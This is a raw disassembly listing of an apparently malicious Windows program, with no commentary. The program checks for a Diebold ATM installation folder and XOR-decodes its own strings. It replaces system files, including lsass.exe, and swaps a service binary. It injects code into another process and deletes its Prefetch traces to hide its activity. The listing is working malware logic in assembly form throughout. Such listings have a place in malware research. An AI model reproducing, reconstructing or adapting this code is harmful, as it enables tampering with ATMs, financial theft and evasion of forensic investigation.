  0040406E: jnz     short loc_404093
  00404070: call    GetLastError
  00404075: cmp     eax, 426h
  0040407A: jz      short loc_40409C
  0040407C: mov     edx, offset aStop; "Stop "
  00404081: mov     eax, offset aControlservice; "ControlService "
  00404086: mov     ecx, [esp+444h+lpServiceName]; LPCSTR
  00404089: call    sub_4039A0
  0040408E: jmp     loc_4041A4
  00404093: mov     dl, 31h ; '1'
  00404095: mov     eax, esi; hService
  00404097: call    sub_403D70
  0040409C: mov     eax, [ebp+0Ch]
  0040409F: push    eax; lpString2
  004040A0: lea     eax, [esp+448h+ExistingFileName]
  004040A7: push    eax; lpString1
  004040A8: call    lstrcpyA
  004040AD: push    offset aBak; ".bak"
  004040B2: lea     eax, [esp+448h+ExistingFileName]
  004040B9: push    eax; lpString1
  004040BA: call    lstrcatA
  004040BF: mov     edx, [esp+444h+hMem]; lpBuffer
  004040C3: mov     ecx, [esp+444h+var_434]
  004040C7: mov     eax, [ebp+0Ch]; lpFileName
  004040CA: call    sub_403CF4
  004040CF: mov     eax, [esp+444h+hMem]
  004040D3: push    eax; hMem
  004040D4: call    LocalFree_0
  004040D9: xor     eax, eax
  004040DB: mov     [esp+444h+ServiceArgVectors], eax
  004040DF: lea     eax, [esp+444h+ServiceArgVectors]
  004040E3: push    eax; lpServiceArgVectors
  004040E4: push    0; dwNumServiceArgs
  004040E6: push    esi; hService
  004040E7: call    StartServiceA
  004040EC: cmp     eax, 1
  004040EF: sbb     ebx, ebx
  004040F1: inc     ebx
  004040F2: test    bl, bl
  004040F4: jnz     loc_4041A4
  004040FA: mov     eax, offset aStartservice; "StartService"
  004040FF: xor     ecx, ecx; LPCSTR
  00404101: xor     edx, edx; LPCSTR
  00404103: call    sub_4039A0
  00404108: jmp     loc_4041A4
  0040410D: lea     eax, [esp+444h+ServiceStatus]
  00404111: push    eax; lpServiceStatus
  00404112: push    1; dwControl
  00404114: push    esi; hService
  00404115: call    ControlService
  0040411A: test    eax, eax
  0040411C: jnz     short loc_40413E
  0040411E: call    GetLastError
  00404123: cmp     eax, 426h
  00404128: jz      short loc_404147
  0040412A: mov     edx, offset aStop; "Stop "
  0040412F: mov     eax, offset aControlservice; "ControlService "
  00404134: mov     ecx, [esp+444h+lpServiceName]; LPCSTR
  00404137: call    sub_4039A0
  0040413C: jmp     short loc_4041A4
  0040413E: mov     dl, 31h ; '1'
  00404140: mov     eax, esi; hService
  00404142: call    sub_403D70
  00404147: mov     eax, [ebp+0Ch]
  0040414A: push    eax; lpString2
  0040414B: lea     eax, [esp+448h+ExistingFileName]
  00404152: push    eax; lpString1
  00404153: call    lstrcpyA
  00404158: push    offset aBak; ".bak"
  0040415D: lea     eax, [esp+448h+ExistingFileName]
  00404164: push    eax; lpString1
  00404165: call    lstrcatA
  0040416A: push    0; bFailIfExists
  0040416C: mov     eax, [ebp+0Ch]
  0040416F: push    eax; lpNewFileName
  00404170: lea     eax, [esp+44Ch+ExistingFileName]
  00404177: push    eax; lpExistingFileName
  00404178: call    CopyFileA
  0040417D: test    eax, eax
  0040417F: jnz     short loc_404197
  00404181: lea     ecx, [esp+444h+ExistingFileName]; LPCSTR
  00404188: mov     edx, offset aStop; "Stop "
  0040418D: mov     eax, offset aCopyfile; "CopyFile "
  00404192: call    sub_4039A0
  00404197: lea     eax, [esp+444h+String1]
  0040419E: push    eax; lpFileName
  0040419F: call    DeleteFileA
  004041A4: push    esi; hSCObject
  004041A5: call    CloseServiceHandle
  004041AA: push    edi; hSCObject
  004041AB: call    CloseServiceHandle
  004041B0: mov     eax, ebx
  004041B2: add     esp, 434h
  004041B8: pop     ebp
  004041B9: pop     edi
  004041BA: pop     esi
  004041BB: pop     ebx
  004041BC: retn

Function: sub_40426C
  0040426C: push    ebx
  0040426D: add     esp, 0FFFFFAFCh
  00404273: xor     ebx, ebx
  00404275: push    0FFh; nFileSystemNameSize
  0040427A: lea     eax, [esp+50Ch+FileSystemNameBuffer]
  0040427E: push    eax; lpFileSystemNameBuffer
  0040427F: lea     eax, [esp+510h+MaximumComponentLength]
  00404283: push    eax; lpFileSystemFlags
  00404284: lea     eax, [esp+514h+MaximumComponentLength]
  00404288: push    eax; lpMaximumComponentLength
  00404289: push    0; lpVolumeSerialNumber
  0040428B: push    0; nVolumeNameSize
  0040428D: push    0; lpVolumeNameBuffer
  0040428F: push    0; lpRootPathName
  00404291: call    GetVolumeInformationA
  00404296: test    eax, eax
  00404298: jz      short loc_4042A7
  0040429A: lea     eax, [esp+508h+FileSystemNameBuffer]
  0040429E: cmp     dword ptr [eax], 5346544Eh
  004042A4: setz    bl
  004042A7: push    100h; uSize
  004042AC: lea     eax, [esp+50Ch+Buffer]
  004042B3: push    eax; lpBuffer
  004042B4: call    GetWindowsDirectoryA
  004042B9: push    100h; uSize
  004042BE: lea     eax, [esp+50Ch+String1]
  004042C5: push    eax; lpBuffer
  004042C6: call    GetWindowsDirectoryA
  004042CB: test    bl, bl
  004042CD: jz      short loc_4042DC
  004042CF: mov     eax, ds:off_50E0; "\t2'00;&!:;0{78%o'01&!:;0{78%UUUU\t2'00"...
  004042D4: mov     ebx, ds:off_50E4; "\t2'00;&!:;0{78%o79 0&!:;0{78%UUUTagEnd"
  004042DA: jmp     short loc_4042E7
  004042DC: mov     eax, ds:off_50D8; "\t'01&!:;0{78%UUU\t79 0&!:;0y78%UU\t2'0"...
  004042E1: mov     ebx, ds:off_50DC; "\t79 0&!:;0y78%UU\t2'00;&!:;0{78%o'01&!"...
  004042E7: push    eax; lpString2
  004042E8: lea     eax, [esp+50Ch+Buffer]
  004042EF: push    eax; lpString1
  004042F0: call    lstrcatA
  004042F5: push    ebx; lpString2
  004042F6: lea     eax, [esp+50Ch+String1]
  004042FD: push    eax; lpString1
  004042FE: call    lstrcatA
  00404303: push    100h; uSize
  00404308: lea     eax, [esp+50Ch+ExistingFileName]
  0040430F: push    eax; lpBuffer
  00404310: call    GetWindowsDirectoryA
  00404315: push    100h; uSize
  0040431A: lea     eax, [esp+50Ch+FileName]
  00404321: push    eax; lpBuffer
  00404322: call    GetWindowsDirectoryA
  00404327: mov     eax, ds:off_50D0
  0040432C: push    eax; lpString2
  0040432D: lea     eax, [esp+50Ch+ExistingFileName]
  00404334: push    eax; lpString1
  00404335: call    lstrcatA
  0040433A: mov     eax, ds:off_50D4; "\t>9UUUUU\t'01&!:;0{78%UUU\t79 0&!:;0y7"...
  0040433F: push    eax; lpString2
  00404340: lea     eax, [esp+50Ch+FileName]
  00404347: push    eax; lpString1
  00404348: call    lstrcatA
  0040434D: push    0FFFFFFFFh; bFailIfExists
  0040434F: lea     eax, [esp+50Ch+Buffer]
  00404356: push    eax; lpNewFileName
  00404357: lea     eax, [esp+510h+ExistingFileName]
  0040435E: push    eax; lpExistingFileName
  0040435F: call    CopyFileA
  00404364: lea     eax, [esp+508h+ExistingFileName]
  0040436B: push    eax; lpFileName
  0040436C: call    DeleteFileA
  00404371: push    0FFFFFFFFh; bFailIfExists
  00404373: lea     eax, [esp+50Ch+String1]
  0040437A: push    eax; lpNewFileName
  0040437B: lea     eax, [esp+510h+FileName]
  00404382: push    eax; lpExistingFileName
  00404383: call    CopyFileA
  00404388: lea     eax, [esp+508h+FileName]
  0040438F: push    eax; lpFileName
  00404390: call    DeleteFileA
  00404395: add     esp, 504h
  0040439B: pop     ebx
  0040439C: retn

Function: sub_4043A0
  004043A0: push    ebx
  004043A1: push    esi
  004043A2: push    edi
  004043A3: push    ebp
  004043A4: add     esp, 0FFFFFDDCh
  004043AA: mov     edi, edx
  004043AC: mov     ebp, eax
  004043AE: xor     ebx, ebx
  004043B0: mov     edx, ebp
  004043B2: mov     eax, 8
  004043B7: call    unknown_libname_52; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004043BC: mov     esi, eax
  004043BE: cmp     esi, 0FFFFFFFFh
  004043C1: jnz     short loc_4043D3
  004043C3: mov     eax, offset aCreatetoolhelp_0; "CreateToolhelp32Snapshot"
  004043C8: xor     ecx, ecx; LPCSTR
  004043CA: xor     edx, edx; LPCSTR
  004043CC: call    sub_4039A0
  004043D1: jmp     short loc_404429
  004043D3: mov     [esp+234h+var_234], 224h
  004043DA: mov     edx, esp
  004043DC: mov     eax, esi
  004043DE: call    unknown_libname_55; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004043E3: test    eax, eax
  004043E5: jz      short loc_404415
  004043E7: push    edi; lpString2
  004043E8: lea     eax, [esp+238h+String1]
  004043EF: push    eax; lpString1
  004043F0: call    lstrcmpiA
  004043F5: test    eax, eax
  004043F7: jnz     short loc_404402
  004043F9: mov     eax, ebp; dwProcessId
  004043FB: call    sub_403A44
  00404400: jmp     short loc_404429
  00404402: test    bl, bl
  00404404: jnz     short loc_404423
  00404406: mov     edx, esp
  00404408: mov     eax, esi
  0040440A: call    unknown_libname_56; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040440F: test    eax, eax
  00404411: jnz     short loc_4043E7
  00404413: jmp     short loc_404423
  00404415: mov     eax, offset aModule32first_0; "Module32First"
  0040441A: xor     ecx, ecx; LPCSTR
  0040441C: xor     edx, edx; LPCSTR
  0040441E: call    sub_4039A0
  00404423: push    esi; hObject
  00404424: call    CloseHandle
  00404429: mov     eax, ebx
  0040442B: add     esp, 224h
  00404431: pop     ebp
  00404432: pop     edi
  00404433: pop     esi
  00404434: pop     ebx
  00404435: retn

Function: sub_404464
  00404464: push    ebx
  00404465: push    esi
  00404466: push    edi
  00404467: push    ebp
  00404468: add     esp, 0FFFFFED8h
  0040446E: mov     ebp, edx
  00404470: mov     edi, eax
  00404472: xor     ebx, ebx
  00404474: xor     edx, edx
  00404476: mov     eax, 2
  0040447B: call    unknown_libname_52; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00404480: mov     esi, eax
  00404482: cmp     esi, 0FFFFFFFFh
  00404485: jz      short loc_4044D0
  00404487: mov     [esp+138h+var_138], 128h
  0040448E: mov     edx, esp
  00404490: mov     eax, esi
  00404492: call    unknown_libname_53; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00404497: test    eax, eax
  00404499: jz      short loc_4044CA
  0040449B: lea     eax, [esp+138h+String2]
  0040449F: push    eax; lpString2
  004044A0: push    edi; lpString1
  004044A1: call    lstrcmpiA
  004044A6: test    eax, eax
  004044A8: jnz     short loc_4044B7
  004044AA: mov     edx, ebp; lpString2
  004044AC: mov     eax, [esp+138h+dwProcessId]; dwProcessId
  004044B0: call    sub_4043A0
  004044B5: mov     ebx, eax
  004044B7: test    bl, bl
  004044B9: jnz     short loc_4044C8
  004044BB: mov     edx, esp
  004044BD: mov     eax, esi
  004044BF: call    unknown_libname_54; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004044C4: test    eax, eax
  004044C6: jnz     short loc_40449B
  004044C8: mov     bl, 1
  004044CA: push    esi; hObject
  004044CB: call    CloseHandle
  004044D0: mov     eax, ebx
  004044D2: add     esp, 128h
  004044D8: pop     ebp
  004044D9: pop     edi
  004044DA: pop     esi
  004044DB: pop     ebx
  004044DC: retn

Function: sub_4044E0
  004044E0: push    ebx
  004044E1: add     esp, 0FFFFFF00h
  004044E7: push    100h; uSize
  004044EC: lea     eax, [esp+108h+Buffer]
  004044F0: push    eax; lpBuffer
  004044F1: call    GetWindowsDirectoryA
  004044F6: push    offset aLsassExe; "\\lsass.exe"
  004044FB: lea     eax, [esp+108h+Buffer]
  004044FF: push    eax; lpString1
  00404500: call    lstrcatA
  00404505: mov     edx, esp; lpString2
  00404507: mov     eax, offset String1; "lsass.exe"
  0040450C: call    sub_404464
  00404511: mov     ebx, 32h ; '2'
  00404516: push    esp; lpFileName
  00404517: call    DeleteFileA
  0040451C: test    eax, eax
  0040451E: jnz     short loc_404536
  00404520: call    GetLastError
  00404525: cmp     eax, 2
  00404528: jz      short loc_404536
  0040452A: push    64h ; 'd'; dwMilliseconds
  0040452C: call    Sleep
  00404531: dec     ebx
  00404532: test    ebx, ebx
  00404534: ja      short loc_404516
  00404536: add     esp, 100h
  0040453C: pop     ebx
  0040453D: retn

Function: sub_404558
  00404558: push    ebx
  00404559: push    esi
  0040455A: push    edi
  0040455B: push    ebp
  0040455C: mov     edi, edx
  0040455E: mov     ebp, eax
  00404560: xor     ebx, ebx
  00404562: xor     edx, edx
  00404564: mov     eax, 2
  00404569: call    unknown_libname_52; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040456E: mov     esi, eax
  00404570: cmp     esi, 0FFFFFFFFh
  00404573: jz      short loc_4045AE
  00404575: mov     dword ptr [edi], 128h
  0040457B: mov     edx, edi
  0040457D: mov     eax, esi
  0040457F: call    unknown_libname_53; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00404584: test    eax, eax
  00404586: jz      short loc_4045A8
  00404588: push    ebp; lpString2
  00404589: lea     eax, [edi+24h]
  0040458C: push    eax; lpString1
  0040458D: call    lstrcmpiA
  00404592: test    eax, eax
  00404594: setz    bl
  00404597: test    bl, bl
  00404599: jnz     short loc_4045A8
  0040459B: mov     edx, edi
  0040459D: mov     eax, esi
  0040459F: call    unknown_libname_54; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004045A4: test    eax, eax
  004045A6: jnz     short loc_404588
  004045A8: push    esi; hObject
  004045A9: call    CloseHandle
  004045AE: mov     eax, ebx
  004045B0: pop     ebp
  004045B1: pop     edi
  004045B2: pop     esi
  004045B3: pop     ebx
  004045B4: retn

Function: sub_4045B8
  004045B8: push    ebp
  004045B9: mov     ebp, esp
  004045BB: add     esp, 0FFFFFEC0h
  004045C1: push    ebx
  004045C2: push    esi
  004045C3: push    edi
  004045C4: mov     [ebp+var_8], ecx
  004045C7: mov     [ebp+var_4], edx
  004045CA: mov     ebx, eax
  004045CC: mov     edi, [ebp+arg_8]
  004045CF: mov     [ebp+var_9], 0
  004045D3: lea     edx, [ebp+var_13D]
  004045D9: mov     eax, ebx; lpString2
  004045DB: call    sub_404558
  004045E0: test    al, al
  004045E2: jnz     short loc_4045F7
  004045E4: mov     eax, offset aGetprocessentr; "getProcessEntry"
  004045E9: xor     ecx, ecx; LPCSTR
  004045EB: mov     edx, ebx; LPCSTR
  004045ED: call    sub_4039A0
  004045F2: jmp     loc_404708
  004045F7: mov     [ebp+var_15], 0
  004045FB: mov     eax, [ebp+dwProcessId]
  00404601: push    eax; dwProcessId
  00404602: push    0; bInheritHandle
  00404604: push    1F0FFFh; dwDesiredAccess
  00404609: call    OpenProcess
  0040460E: mov     ebx, eax
  00404610: test    ebx, ebx
  00404612: jnz     short loc_40463D
  00404614: call    GetLastError
  00404619: cmp     eax, 5
  0040461C: jnz     short loc_40462A
  0040461E: cmp     [ebp+var_15], 0
  00404622: jnz     short loc_40462A
  00404624: mov     [ebp+var_15], 1
  00404628: jmp     short loc_4045FB
  0040462A: mov     eax, offset aOpenprocess; "OpenProcess"
  0040462F: xor     ecx, ecx; LPCSTR
  00404631: xor     edx, edx; LPCSTR
  00404633: call    sub_4039A0
  00404638: jmp     loc_404708
  0040463D: push    40h ; '@'
  0040463F: push    3000h
  00404644: mov     eax, [ebp+var_8]
  00404647: add     eax, edi
  00404649: push    eax
  0040464A: push    0
  0040464C: push    ebx
  0040464D: call    ds:dword_4066B0
  00404653: mov     esi, eax
  00404655: test    esi, esi
  00404657: jnz     short loc_404664
  00404659: push    ebx; hObject
  0040465A: call    CloseHandle
  0040465F: jmp     loc_404708
  00404664: lea     eax, [ebp+var_10]
  00404667: push    eax
  00404668: push    edi
  00404669: mov     eax, [ebp+arg_C]
  0040466C: push    eax
  0040466D: push    esi
  0040466E: push    ebx
  0040466F: call    ds:dword_4066B4
  00404675: lea     eax, [ebp+var_10]
  00404678: push    eax
  00404679: mov     eax, [ebp+var_8]
  0040467C: push    eax
  0040467D: mov     eax, [ebp+var_4]
  00404680: push    eax
  00404681: mov     eax, esi
  00404683: add     eax, edi
  00404685: push    eax
  00404686: push    ebx
  00404687: call    ds:dword_4066B4
  0040468D: lea     eax, [ebp+var_14]
  00404690: push    eax
  00404691: push    0
  00404693: add     edi, esi
  00404695: push    edi
  00404696: push    esi
  00404697: push    0
  00404699: push    0
  0040469B: push    ebx
  0040469C: call    ds:dword_4066B8
  004046A2: mov     edi, eax
  004046A4: cmp     [ebp+dwMilliseconds], 0
  004046A8: jbe     short loc_4046FA
  004046AA: mov     eax, [ebp+dwMilliseconds]
  004046AD: push    eax; dwMilliseconds
  004046AE: push    edi; hHandle
  004046AF: call    WaitForSingleObject
  004046B4: test    eax, eax
  004046B6: jnz     short loc_4046FE
  004046B8: mov     [ebp+var_9], 1
  004046BC: mov     eax, [ebp+lpExitCode]
  004046BF: push    eax; lpExitCode
  004046C0: push    edi; hThread
  004046C1: call    GetExitCodeThread
  004046C6: test    eax, eax
  004046C8: jnz     short loc_4046D8
  004046CA: mov     eax, offset aGetexitcodethr; "GetExitCodeThread"
  004046CF: xor     ecx, ecx; LPCSTR
  004046D1: xor     edx, edx; LPCSTR
  004046D3: call    sub_4039A0
  004046D8: push    8000h; dwFreeType
  004046DD: push    0; dwSize
  004046DF: push    esi; lpAddress
  004046E0: push    ebx; hProcess
  004046E1: call    VirtualFreeEx
  004046E6: test    eax, eax
  004046E8: jnz     short loc_4046FE
  004046EA: mov     eax, offset aVirtualfreeex; "VirtualFreeEx"
  004046EF: xor     ecx, ecx; LPCSTR
  004046F1: xor     edx, edx; LPCSTR
  004046F3: call    sub_4039A0
  004046F8: jmp     short loc_4046FE
  004046FA: mov     [ebp+var_9], 1
  004046FE: test    edi, edi
  00404700: jz      short loc_404708
  00404702: push    edi; hObject
  00404703: call    CloseHandle
  00404708: mov     al, [ebp+var_9]
  0040470B: pop     edi
  0040470C: pop     esi
  0040470D: pop     ebx
  0040470E: mov     esp, ebp
  00404710: pop     ebp
  00404711: retn    10h

Function: sub_404754
  00404754: push    ebp
  00404755: mov     ebp, esp
  00404757: add     esp, 0FFFFFEC0h
  0040475D: push    ebx
  0040475E: push    esi
  0040475F: push    edi
  00404760: mov     ebx, [ebp+arg_0]
  00404763: push    3E8h
  00404768: call    dword ptr [ebx+14h]
  0040476B: lea     eax, [ebp+var_140]
  00404771: push    eax
  00404772: lea     eax, [ebx+18h]
  00404775: push    eax
  00404776: call    dword ptr [ebx]
  00404778: mov     esi, eax
  0040477A: test    esi, esi
  0040477C: jbe     short loc_4047AF
  0040477E: lea     eax, [ebp+var_114]
  00404784: push    eax
  00404785: xor     eax, eax
  00404787: mov     al, [ebx+118h]
  0040478D: lea     eax, [ebx+eax+18h]
  00404791: push    eax
  00404792: call    dword ptr [ebx+8]
  00404795: lea     eax, [ebx+18h]
  00404798: push    eax
  00404799: call    dword ptr [ebx+10h]
  0040479C: lea     eax, [ebp+var_140]
  004047A2: push    eax
  004047A3: push    esi
  004047A4: call    dword ptr [ebx+4]
  004047A7: test    eax, eax
  004047A9: jnz     short loc_40477E
  004047AB: push    esi
  004047AC: call    dword ptr [ebx+0Ch]
  004047AF: mov     eax, edi
  004047B1: pop     edi
  004047B2: pop     esi
  004047B3: pop     ebx
  004047B4: mov     esp, ebp
  004047B6: pop     ebp
  004047B7: retn    4

Function: nullsub_2
  004047BC: retn

Function: sub_4047C0
  004047C0: push    ebx
  004047C1: push    esi
  004047C2: push    edi
  004047C3: add     esp, 0FFFFFDE0h
  004047C9: mov     esi, eax
  004047CB: lea     edi, [esp+22Ch+var_128]
  004047D2: push    offset aKernel32Dll_0; "kernel32.dll"
  004047D7: call    GetModuleHandleA_0
  004047DC: mov     ebx, eax
  004047DE: push    offset aFindfirstfilea; "FindFirstFileA"
  004047E3: push    ebx; hModule
  004047E4: call    GetProcAddress
  004047E9: mov     [edi], eax
  004047EB: push    offset aFindnextfilea; "FindNextFileA"
  004047F0: push    ebx; hModule
  004047F1: call    GetProcAddress
  004047F6: mov     [edi+4], eax
  004047F9: push    offset aFindclose; "FindClose"
  004047FE: push    ebx; hModule
  004047FF: call    GetProcAddress
  00404804: mov     [edi+0Ch], eax
  00404807: push    offset aLstrcpy; "lstrcpy"
  0040480C: push    ebx; hModule
  0040480D: call    GetProcAddress
  00404812: mov     [edi+8], eax
  00404815: push    offset aDeletefilea; "DeleteFileA"
  0040481A: push    ebx; hModule
  0040481B: call    GetProcAddress
  00404820: mov     [edi+10h], eax
  00404823: push    offset aSleep; "Sleep"
  00404828: push    ebx; hModule
  00404829: call    GetProcAddress
  0040482E: mov     [edi+14h], eax
  00404831: push    100h; uSize
  00404836: lea     eax, [edi+18h]
  00404839: push    eax; lpBuffer
  0040483A: call    GetWindowsDirectoryA
  0040483F: push    offset aPrefetch; "\\Prefetch\\"
  00404844: lea     eax, [edi+18h]
  00404847: push    eax; lpString1
  00404848: call    lstrcatA
  0040484D: lea     eax, [edi+18h]
  00404850: push    eax; lpString
  00404851: call    lstrlenA
  00404856: mov     [edi+118h], al
  0040485C: push    100h; nSize
  00404861: lea     eax, [esp+230h+Filename]
  00404865: push    eax; lpFilename
  00404866: push    0; hModule
  00404868: call    GetModuleFileNameA
  0040486D: lea     eax, [esp+22Ch+Filename]
  00404871: push    eax; lpString
  00404872: call    lstrlenA
  00404877: lea     eax, [esp+eax+22Ch+Filename]
  0040487B: jmp     short loc_40487E
  0040487D: dec     eax
  0040487E: cmp     byte ptr [eax], 5Ch ; '\'
  00404881: jnz     short loc_40487D
  00404883: inc     eax
  00404884: push    eax; lpString2
  00404885: lea     eax, [edi+18h]
  00404888: push    eax; lpString1
  00404889: call    lstrcatA
  0040488E: push    offset aPf; "-*.pf"
  00404893: lea     eax, [edi+18h]
  00404896: push    eax; lpString1
  00404897: call    lstrcatA
  0040489C: mov     eax, offset sub_404754
  004048A1: push    eax; lpExitCode
  004048A2: mov     edx, offset nullsub_2
  004048A7: sub     edx, eax
  004048A9: push    edx; dwMilliseconds
  004048AA: push    0; int
  004048AC: lea     eax, [esp+238h+var_22C]
  004048B0: push    eax; int
  004048B1: mov     edx, edi; int
  004048B3: mov     ecx, 119h; int
  004048B8: mov     eax, esi; lpString2
  004048BA: call    sub_4045B8
  004048BF: add     esp, 220h
  004048C5: pop     edi
  004048C6: pop     esi
  004048C7: pop     ebx
  004048C8: retn

Function: sub_404938
  00404938: push    ebx
  00404939: push    esi
  0040493A: push    edi
  0040493B: push    ebp
  0040493C: push    offset aKernel32Dll_1; "kernel32.dll"
  00404941: call    GetModuleHandleA_0
  00404946: mov     ebp, eax
  00404948: mov     edi, offset dword_4066B0
  0040494D: mov     esi, 3
  00404952: mov     ebx, offset off_50BC
  00404957: mov     eax, [ebx]
  00404959: push    eax; lpProcName
  0040495A: push    ebp; hModule
  0040495B: call    GetProcAddress
  00404960: mov     [edi], eax
  00404962: add     edi, 4
  00404965: add     ebx, 4
  00404968: dec     esi
  00404969: jnz     short loc_404957
  0040496B: pop     ebp
  0040496C: pop     edi
  0040496D: pop     esi
  0040496E: pop     ebx
  0040496F: retn

Function: sub_404980
  00404980: push    ebx
  00404981: push    ecx
  00404982: mov     ebx, ds:off_50B8
  00404988: add     ebx, 8
  0040498B: push    esp; lpflOldProtect
  0040498C: push    40h ; '@'; flNewProtect
  0040498E: mov     eax, ds:off_50E8; "TagEnd"
  00404993: sub     eax, ebx
  00404995: push    eax; dwSize
  00404996: push    ebx; lpAddress
  00404997: call    VirtualProtect
  0040499C: test    eax, eax
  0040499E: jnz     short loc_4049B7
  004049A0: mov     eax, offset aVirtualprotect; "VirtualProtect"
  004049A5: xor     ecx, ecx; LPCSTR
  004049A7: xor     edx, edx; LPCSTR
  004049A9: call    sub_4039A0
  004049AE: jmp     short loc_4049B7
  004049B0: mov     al, [ebx]
  004049B2: xor     al, 55h
  004049B4: mov     [ebx], al
  004049B6: inc     ebx
  004049B7: cmp     ebx, ds:off_50E8; "TagEnd"
  004049BD: jnz     short loc_4049B0
  004049BF: pop     edx
  004049C0: pop     ebx
  004049C1: retn

Function: unknown_libname_57
  004049D4: push    ebp
  004049D5: mov     ebp, esp
  004049D7: xor     eax, eax
  004049D9: push    ebp
  004049DA: push    offset loc_4049F3
  004049DF: push    dword ptr fs:[eax]
  004049E2: mov     fs:[eax], esp
  004049E5: xor     eax, eax
  004049E7: pop     edx
  004049E8: pop     ecx
  004049E9: pop     ecx
  004049EA: mov     fs:[eax], edx
  004049ED: push    offset loc_4049FA
  004049F2: retn
  004049F3: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004049F8: jmp     short loc_4049F2
  004049FA: pop     ebp
  004049FB: retn

Function: start
  00404A3C: push    ebp
  00404A3D: mov     ebp, esp
  00404A3F: add     esp, 0FFFFFFF0h
  00404A42: mov     eax, offset dword_4049FC
  00404A47: call    @Sysinit@@InitExe$qqrpv; Sysinit::__linkproc__ InitExe(void *)
  00404A4C: push    offset FileName; "C:\\Diebold"
  00404A51: call    GetFileAttributesA
  00404A56: cmp     eax, 0FFFFFFFFh
  00404A59: jz      short loc_404A85
  00404A5B: call    sub_404980
  00404A60: call    sub_404938
  00404A65: call    sub_40426C
  00404A6A: call    sub_4044E0
  00404A6F: mov     dl, 1
  00404A71: mov     eax, ds:off_50B0; "LogWriter"
  00404A76: call    sub_403EBC
  00404A7B: mov     eax, ds:off_50C8; lpString2
  00404A80: call    sub_4047C0
  00404A85: call    @System@@Halt0$qqrv; System::__linkproc__ Halt0(void)

